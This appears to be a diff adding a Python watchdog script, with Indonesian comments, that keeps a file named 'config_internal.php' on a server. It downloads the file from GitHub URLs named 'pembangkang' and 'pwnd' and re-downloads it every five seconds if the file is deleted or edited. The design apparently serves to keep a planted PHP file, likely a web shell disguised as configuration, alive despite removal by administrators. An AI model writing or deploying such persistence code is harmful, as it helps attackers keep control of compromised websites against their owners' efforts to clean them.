@@ -1,0 +1,86 @@
+import os
+import time
+import urllib.request
+import stat
+import hashlib
+
+# ========================
+# Konfigurasi
+# ========================
+URL_MAIN = "https://raw.githubusercontent.com/ASDF710/ZAYN/refs/heads/main/pembangkang"
+URL_BACKUP = "https://raw.githubusercontent.com/ASDF710/ZAYN/refs/heads/main/pwnd"
+FILE_NAME = "config_internal.php"
+SLEEP_INTERVAL = 5  # detik antar polling
+FILE_MODE = 0o644   # permission yang dipaksa
+
+def md5_file(path):
+    """Hitung MD5 file"""
+    if not os.path.exists(path):
+        return None
+    hash_md5 = hashlib.md5()
+    with open(path, "rb") as f:
+        for chunk in iter(lambda: f.read(4096), b""):
+            hash_md5.update(chunk)
+    return hash_md5.hexdigest()
+
+def download_file(url, dest_path):
+    """Download file dari URL dan simpan ke dest_path"""
+    try:
+        with urllib.request.urlopen(url) as response:
+            data = response.read()
+        with open(dest_path, "wb") as f:
+            f.write(data)
+        os.chmod(dest_path, FILE_MODE)  # set permission 0644
+        print(f"[INFO] Downloaded {url} -> {dest_path} (mode 0644)")
+        return True
+    except Exception as e:
+        print(f"[ERROR] Failed to download {url}: {e}")
+        return False
+
+def ensure_file():
+    """Pastikan file utama ada, permission 0644, dan konten tidak diubah"""
+    if not os.path.exists(FILE_NAME):
+        print(f"[EVENT] {FILE_NAME} missing! Restoring from backup URL...")
+        success = download_file(URL_BACKUP, FILE_NAME)
+        if success:
+            print(f"[INFO] Restored {FILE_NAME} from backup URL")
+        else:
+            print("[ERROR] Failed to restore from backup URL")
+    else:
+        # paksa permission menjadi 0644 jika berubah
+        current_mode = stat.S_IMODE(os.stat(FILE_NAME).st_mode)
+        if current_mode != FILE_MODE:
+            os.chmod(FILE_NAME, FILE_MODE)
+            print(f"[INFO] Fixed permission of {FILE_NAME} to 0644 (was {oct(current_mode)})")
+
+        # cek apakah konten file berubah dibanding URL_MAIN
+        try:
+            with urllib.request.urlopen(URL_MAIN) as response:
+                main_data = response.read()
+            main_hash = hashlib.md5(main_data).hexdigest()
+            current_hash = md5_file(FILE_NAME)
+            if current_hash != main_hash:
+                print(f"[EVENT] {FILE_NAME} modified! Restoring original content from URL_MAIN...")
+                download_file(URL_MAIN, FILE_NAME)
+        except Exception as e:
+            print(f"[WARN] Failed to fetch MAIN URL for hash check: {e}")
+
+def main():
+    # buat file utama dari URL_MAIN jika belum ada
+    if not os.path.exists(FILE_NAME):
+        print(f"[INFO] {FILE_NAME} not found, creating from main URL...")
+        success = download_file(URL_MAIN, FILE_NAME)
+        if not success:
+            print("[ERROR] Failed to create initial file. Exiting.")
+            return
+
+    print(f"[INFO] Watching {FILE_NAME}... Press Ctrl+C to stop.")
+    try:
+        while True:
+            ensure_file()
+            time.sleep(SLEEP_INTERVAL)
+    except KeyboardInterrupt:
+        print("[STOP] Interrupted by user")
+
+if __name__ == "__main__":
+    main()
